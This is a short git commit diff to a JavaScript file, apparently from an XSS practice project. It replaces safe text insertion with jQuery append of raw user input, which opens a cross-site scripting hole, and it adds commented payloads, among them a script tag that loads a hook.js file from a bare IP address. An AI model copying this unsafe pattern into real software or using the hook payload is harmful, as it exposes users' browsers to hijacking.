9c1e5ed410ec0181b87d70610817576e24186df7
flyberson <flyberson12@gmail.com>
2018-06-19 22:43:02 +0200

    added comments

--- Javascript/js1.js
+++ Javascript/js1.js
@@ -13,7 +13,10 @@ function getpoke(){
    userinputtext= document.getElementById("text1").value;
 
 
-    //$( "#body" ).append( userinputtext );
-    document.getElementById("body").appendChild(document.createTextNode(userinputtext));
+    $( "#body" ).append( userinputtext );
+
+    //document.getElementById("body").appendChild(document.createTextNode(userinputtext));
     //<script>window.location.replace("https://www.google.dk/")</script>
+    //http://35.204.168.251:3000/hook.js
+    // <script src="http://35.204.168.251:3000/hook.js" type="text/javascript"><\/script>
 }
